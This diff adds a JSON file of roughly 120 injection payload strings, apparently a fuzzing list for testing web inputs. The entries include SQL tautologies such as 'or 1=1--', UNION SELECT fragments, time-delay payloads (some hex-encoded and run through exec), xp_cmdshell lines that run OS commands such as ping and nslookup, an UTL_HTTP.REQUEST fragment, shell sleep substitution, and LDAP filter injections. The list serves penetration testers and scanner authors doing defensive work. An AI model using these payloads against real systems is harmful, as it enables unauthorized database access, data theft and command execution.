@@ -1,0 +1,227 @@
+{
+"sql_inj_string_0":{"sql_inj_string":"'"}
+,
+"sql_inj_string_1":{"sql_inj_string":"a' or 1=1--"}
+,
+"sql_inj_string_2":{"sql_inj_string":"%22a%22%22 or 1=1--%22"}
+,
+"sql_inj_string_3":{"sql_inj_string":"or a = a"}
+,
+"sql_inj_string_4":{"sql_inj_string":"a' or 'a' = 'a"}
+,
+"sql_inj_string_5":{"sql_inj_string":"1 or 1=1"}
+,
+"sql_inj_string_6":{"sql_inj_string":"a' waitfor delay '0:0:10'--"}
+,
+"sql_inj_string_7":{"sql_inj_string":"1 waitfor delay '0:0:10'--"}
+,
+"sql_inj_string_8":{"sql_inj_string":"declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)"}
+,
+"sql_inj_string_9":{"sql_inj_string":"declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)"}
+,
+"sql_inj_string_10":{"sql_inj_string":"declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)"}
+,
+"sql_inj_string_11":{"sql_inj_string":"declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)"}
+,
+"sql_inj_string_12":{"sql_inj_string":"a'"}
+,
+"sql_inj_string_13":{"sql_inj_string":"?"}
+,
+"sql_inj_string_14":{"sql_inj_string":"' or 1=1"}
+,
+"sql_inj_string_15":{"sql_inj_string":"ý or 1=1 --"}
+,
+"sql_inj_string_16":{"sql_inj_string":"x' AND userid IS NULL; --"}
+,
+"sql_inj_string_17":{"sql_inj_string":"x' AND email IS NULL; --"}
+,
+"sql_inj_string_18":{"sql_inj_string":"anything' OR 'x'='x"}
+,
+"sql_inj_string_19":{"sql_inj_string":"x' AND 1=(SELECT COUNT(*) FROM tabname); --"}
+,
+"sql_inj_string_20":{"sql_inj_string":"x' AND members.email IS NULL; --"}
+,
+"sql_inj_string_21":{"sql_inj_string":"x' OR full_name LIKE '%Bob%"}
+,
+"sql_inj_string_22":{"sql_inj_string":"23 OR 1=1"}
+,
+"sql_inj_string_23":{"sql_inj_string":"'; exec master..xp_cmdshell 'ping 172.10.1.255'--"}
+,
+"sql_inj_string_24":{"sql_inj_string":"'"}
+,
+"sql_inj_string_25":{"sql_inj_string":"'%20or%20''='"}
+,
+"sql_inj_string_26":{"sql_inj_string":"'%20or%20'x'='x"}
+,
+"sql_inj_string_27":{"sql_inj_string":"%20or%20x=x"}
+,
+"sql_inj_string_28":{"sql_inj_string":"')%20or%20('x'='x"}
+,
+"sql_inj_string_29":{"sql_inj_string":"0 or 1=1"}
+,
+"sql_inj_string_30":{"sql_inj_string":"' or 0=0 --"}
+,
+"sql_inj_string_31":{"sql_inj_string":"%22 or 0=0 --"}
+,
+"sql_inj_string_32":{"sql_inj_string":"or 0=0 --"}
+,
+"sql_inj_string_33":{"sql_inj_string":"' or 0=0 #"}
+,
+"sql_inj_string_34":{"sql_inj_string":"or 0=0 #%22"}
+,
+"sql_inj_string_35":{"sql_inj_string":"or 0=0 #"}
+,
+"sql_inj_string_36":{"sql_inj_string":"' or 1=1--"}
+,
+"sql_inj_string_37":{"sql_inj_string":"%22 or 1=1--"}
+,
+"sql_inj_string_38":{"sql_inj_string":"' or '1'='1'--"}
+,
+"sql_inj_string_39":{"sql_inj_string":"' or 1 --'"}
+,
+"sql_inj_string_40":{"sql_inj_string":"or 1=1--"}
+,
+"sql_inj_string_41":{"sql_inj_string":"or%201=1"}
+,
+"sql_inj_string_42":{"sql_inj_string":"or%201=1 --"}
+,
+"sql_inj_string_43":{"sql_inj_string":"' or 1=1 or ''='"}
+,
+"sql_inj_string_44":{"sql_inj_string":"or 1=1 or %22%22="}
+,
+"sql_inj_string_45":{"sql_inj_string":"' or a=a--"}
+,
+"sql_inj_string_46":{"sql_inj_string":"or a=a"}
+,
+"sql_inj_string_47":{"sql_inj_string":"') or ('a'='a"}
+,
+"sql_inj_string_48":{"sql_inj_string":") or (a=a"}
+,
+"sql_inj_string_49":{"sql_inj_string":"hi or a=a"}
+,
+"sql_inj_string_50":{"sql_inj_string":"hi or 1=1 --%22"}
+,
+"sql_inj_string_51":{"sql_inj_string":"hi' or 1=1 --"}
+,
+"sql_inj_string_52":{"sql_inj_string":"hi' or 'a'='a"}
+,
+"sql_inj_string_53":{"sql_inj_string":"hi') or ('a'='a"}
+,
+"sql_inj_string_54":{"sql_inj_string":"%22hi%22%22) or (%22%22a%22%22=%22%22a%22"}
+,
+"sql_inj_string_55":{"sql_inj_string":"'hi' or 'x'='x';"}
+,
+"sql_inj_string_56":{"sql_inj_string":"@variable"}
+,
+"sql_inj_string_57":{"sql_inj_string":",@variable"}
+,
+"sql_inj_string_59":{"sql_inj_string":"PRINT @@variable"}
+,
+"sql_inj_string_78":{"sql_inj_string":"' or username like '%"}
+,
+"sql_inj_string_79":{"sql_inj_string":"' or uname like '%"}
+,
+"sql_inj_string_80":{"sql_inj_string":"' or userid like '%"}
+,
+"sql_inj_string_81":{"sql_inj_string":"' or uid like '%"}
+,
+"sql_inj_string_82":{"sql_inj_string":"' or user like '%"}
+,
+"sql_inj_string_83":{"sql_inj_string":"exec xp"}
+,
+"sql_inj_string_84":{"sql_inj_string":"exec sp"}
+,
+"sql_inj_string_85":{"sql_inj_string":"'; exec master..xp_cmdshell"}
+,
+"sql_inj_string_86":{"sql_inj_string":"'; exec xp_regread"}
+,
+"sql_inj_string_87":{"sql_inj_string":"t'exec master..xp_cmdshell 'nslookup www.google.com'--"}
+,
+"sql_inj_string_88":{"sql_inj_string":"--sp_password"}
+,
+"sql_inj_string_89":{"sql_inj_string":"\\x27UNION SELECT"}
+,
+"sql_inj_string_90":{"sql_inj_string":"' UNION SELECT"}
+,
+"sql_inj_string_91":{"sql_inj_string":"' UNION ALL SELECT"}
+,
+"sql_inj_string_92":{"sql_inj_string":"' or (EXISTS)"}
+,
+"sql_inj_string_93":{"sql_inj_string":"' (select top 1"}
+,
+"sql_inj_string_94":{"sql_inj_string":"'||UTL_HTTP.REQUEST"}
+,
+"sql_inj_string_95":{"sql_inj_string":"1;SELECT%20*"}
+,
+"sql_inj_string_96":{"sql_inj_string":"to_timestamp_tz"}
+,
+"sql_inj_string_97":{"sql_inj_string":"tz_offset"}
+,
+"sql_inj_string_98":{"sql_inj_string":"<>%22'%;)(&+"}
+,
+"sql_inj_string_99":{"sql_inj_string":"'%20or%201=1"}
+,
+"sql_inj_string_100":{"sql_inj_string":"%27%20or%201=1"}
+,
+"sql_inj_string_101":{"sql_inj_string":"%20$(sleep%2050)"}
+,
+"sql_inj_string_102":{"sql_inj_string":"%20'sleep%2050'"}
+,
+"sql_inj_string_103":{"sql_inj_string":"char%4039%41%2b%40SELECT"}
+,
+"sql_inj_string_104":{"sql_inj_string":"&apos;%20OR"}
+,
+"sql_inj_string_105":{"sql_inj_string":"'sqlattempt1"}
+,
+"sql_inj_string_106":{"sql_inj_string":"(sqlattempt2)"}
+,
+"sql_inj_string_107":{"sql_inj_string":"|"}
+,
+"sql_inj_string_108":{"sql_inj_string":"%7C"}
+,
+"sql_inj_string_109":{"sql_inj_string":"*|"}
+,
+"sql_inj_string_110":{"sql_inj_string":"%2A%7C"}
+,
+"sql_inj_string_111":{"sql_inj_string":"*(|(mail=*))"}
+,
+"sql_inj_string_112":{"sql_inj_string":"%2A%28%7C%28mail%3D%2A%29%29"}
+,
+"sql_inj_string_113":{"sql_inj_string":"*(|(objectclass=*))"}
+,
+"sql_inj_string_114":{"sql_inj_string":"%2A%28%7C%28objectclass%3D%2A%29%29"}
+,
+"sql_inj_string_115":{"sql_inj_string":"("}
+,
+"sql_inj_string_116":{"sql_inj_string":"%28"}
+,
+"sql_inj_string_117":{"sql_inj_string":")"}
+,
+"sql_inj_string_118":{"sql_inj_string":"%29"}
+,
+"sql_inj_string_119":{"sql_inj_string":"&"}
+,
+"sql_inj_string_120":{"sql_inj_string":"%26"}
+,
+"sql_inj_string_121":{"sql_inj_string":"!"}
+,
+"sql_inj_string_122":{"sql_inj_string":"%21"}
+,
+"sql_inj_string_123":{"sql_inj_string":"' or 1=1 or ''='"}
+,
+"sql_inj_string_124":{"sql_inj_string":"' or ''='"}
+,
+"sql_inj_string_125":{"sql_inj_string":"x' or 1=1 or 'x'='y"}
+,
+"sql_inj_string_126":{"sql_inj_string":"/"}
+,
+"sql_inj_string_127":{"sql_inj_string":"//"}
+,
+"sql_inj_string_128":{"sql_inj_string":"//*"}
+,
+"sql_inj_string_129":{"sql_inj_string":"*/*"}
+,
+"sql_inj_string_130":{"sql_inj_string":"a' or 3=3--"}
+,
+"sql_inj_string_131":{"sql_inj_string":"%22a%22%22 or 3=3--%22"}
+}
